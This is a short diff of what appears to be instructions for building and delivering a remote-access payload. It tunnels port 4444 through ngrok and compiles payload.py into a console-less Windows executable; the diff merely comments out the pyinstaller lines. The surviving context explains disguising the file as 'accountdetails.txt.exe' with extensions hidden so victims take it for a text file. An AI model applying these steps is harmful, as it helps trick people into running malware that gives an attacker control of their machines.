@@ -11,9 +11,9 @@ ngrok http 4444
 pip install auto-py-to-exe                 #windows
 run: auto-py-to-exe                        
 # or
-compile the payload.py into payload.exe
-pip install pyinstaller                    #windows
-pyinstaller --OneFile --noconsole payload.py
+#compile the payload.py into payload.exe
+#pip install pyinstaller                    #windows
+#pyinstaller --OneFile --noconsole payload.py
 
 # Rename payload.exe to something important like accountdetails.txt.exe
 # Turn off "show file name extensions" > accountdetails.txt (looks like a text file)
